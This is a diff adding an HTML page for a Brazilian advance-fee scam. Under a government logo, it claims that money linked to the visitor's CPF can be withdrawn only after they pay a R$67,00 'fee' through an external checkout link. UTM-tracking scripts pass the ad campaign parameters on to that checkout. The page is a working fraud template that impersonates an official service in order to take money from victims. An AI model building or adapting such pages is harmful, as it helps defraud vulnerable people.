@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="./../assets/styles/global.css" />
+    <link rel="stylesheet" href="./../assets/styles/tax.css" />
+    <link
+      rel="shortcut icon"
+      href="./../assets/images/app_logo.png"
+      type="image/x-icon"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+      integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js"
+      integrity="sha512-3gJwYpMe3QewGELv8k/BX9vcqhryRdzRMxVfq6ngyWXwo03GFEzjsUm8Q7RZcHPHksttq7/GFoxjCVUjkjvPdw=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    ></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/0.9.0/jquery.mask.min.js"
+      integrity="sha512-oJCa6FS2+zO3EitUSj+xeiEN9UTr+AjqlBZO58OPadb2RfqwxHpjTU8ckIC8F4nKvom7iru2s8Jwdo+Z8zm0Vg=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    ></script>
+    <script src="./../assets/scripts/input-mask.js"></script>
+    <script src="./../assets/scripts/user-data.js"></script>
+    <title>CONSULTA BRASIL</title>
+  </head>
+  <body>
+    <div class="container">
+      <header>
+        <img
+          class="logo"
+          src="./../assets/images/app_logo.png"
+          alt="Consulta Brasil"
+        />
+      </header>
+      <section class="text-center">
+        <div class="tax">
+          <h1>ATENÇÃO!</h1>
+          <h2>
+            O dinheiro vínculado ao CPF
+            <span id="cpf" class="text-yellow">000.000.000-00</span> está
+            disponível para saque até
+            <span id="lastDate" class="text-yellow">00/00/0000</span>. Após esse
+            prazo o dinheiro será retido pela instituição.
+          </h2>
+          <h2>
+            Para prosseguirmos com o seu saque de
+            <span id="amount" class="text-yellow">R$0,00</span> é necessário o
+            pagamento de uma taxa única que pode ser parcelado em até
+            <span class="text-yellow"><b>12x de R$6,73</b></span> ou à vista por
+            <span class="text-yellow"><b>R$67,00</b></span
+            >!
+          </h2>
+          <p>
+            <span class="text-yellow"><b>CLIQUE NO BOTÃO ABAIXO</b></span> PARA
+            REALIZAR O PAGAMENTO DA TAXA E RECEBER SEU SAQUE!
+          </p>
+        </div>
+      </section>
+      <section>
+        <div class="rescue">
+          <!-- PEPPER CHECKOUT
+          <a href="https://pepper.com.br/checkout/index.html?p=49262&o=51285">
+            <button class="btn bg-green btn-rescue" type="button">
+              PAGAR TAXA - R$67,00
+            </button>
+          </a> 
+          -->
+          <!-- PERFECT PAY CHECKOUT -->
+          <a href="https://go.perfectpay.com.br/PPU38CMEUM0">
+            <button class="btn bg-green btn-rescue" type="button">
+              PAGAR TAXA - R$67,00
+            </button>
+          </a>
+          <!-- NEW CHECKOUT
+          <a href="CHECKOUT_LINK_HERE">
+            <button class="btn bg-green btn-rescue" type="button">
+              PAGAR TAXA - R$67,00
+            </button>
+          </a>
+          -->
+        </div>
+        <p class="text-center">
+          SOMENTE APÓS A CONFIRMAÇÃO DO PAGAMENTO DESTA TAXA
+          <b class="text-yellow">SEU SAQUE SERÁ REALIZADO</b>!
+        </p>
+      </section>
+      <footer>
+        <img src="./../assets/images/gov_logo.png" alt="https://gov.br/" />
+        <div class="links center">
+          <p>
+            <a
+              href="./../views/terms-of-use.html"
+              class="btn-link"
+              target="_blank"
+              >Termos de Uso</a
+            >
+            <span class="btn-link"> | </span>
+            <a
+              href="./../views/privacy-policy.html"
+              class="btn-link"
+              target="_blank"
+              >Politica de Privacidade</a
+            >
+          </p>
+        </div>
+
+        <!-- PEPPER UTM 
+        <script>
+          let prefix = ["https://pepper.com.br/checkout"];
+
+          function getParams() {
+            let t = "",
+              e = window.top.location.href,
+              r = new URL(e);
+            if (null != r) {
+              let a = r.searchParams.get("utm_source"),
+                n = r.searchParams.get("utm_medium"),
+                o = r.searchParams.get("utm_campaign"),
+                m = r.searchParams.get("utm_term"),
+                c = r.searchParams.get("utm_content");
+              -1 !== e.indexOf("?") && (t = `&sck=${a}|${n}|${o}|${m}|${c}`),
+                console.log(t);
+            }
+            return t;
+          }
+          !(function () {
+            var t = new URLSearchParams(window.location.search);
+            t.toString() &&
+              document.querySelectorAll("a").forEach(function (e) {
+                for (let r = 0; r < prefix.length; r++)
+                  -1 !== e.href.indexOf(prefix[r]) &&
+                    (-1 === e.href.indexOf("?")
+                      ? (e.href += "?" + t.toString() + getParams())
+                      : (e.href += "&" + t.toString() + getParams()));
+              });
+          })();
+        </script> 
+        -->
+        
+        <!-- PERFECT PAY UTM -->
+        <script>
+            let prefix = ["https://checkout.perfectpay.com.br", "https://go.perfectpay.com.br"];
+        
+            function getParams() {
+                let t = "",
+                    e = window.top.location.href,
+                    r = new URL(e);
+                if (null != r) {
+                    let a = r.searchParams.get("utm_source"),
+                        n = r.searchParams.get("utm_medium"),
+                        o = r.searchParams.get("utm_campaign"),
+                        m = r.searchParams.get("utm_term"),
+                        c = r.searchParams.get("utm_content"); - 1 !== e.indexOf("?") && (t = `&sck=${a}|${n}|${o}|${m}|${c}`), console.log(t)
+                }
+                return t
+            }! function() {
+                var t = new URLSearchParams(window.location.search);
+                t.toString() && document.querySelectorAll("a").forEach(function(e) {
+                    for (let r = 0; r < prefix.length; r++) - 1 !== e.href.indexOf(prefix[r]) && (-1 === e.href.indexOf("?") ? e.href += "?" + t.toString() + getParams() : e.href += "&" + t.toString() + getParams())
+                })
+            }();
+        </script>
+      </footer>
+    </div>
+  </body>
+</html>
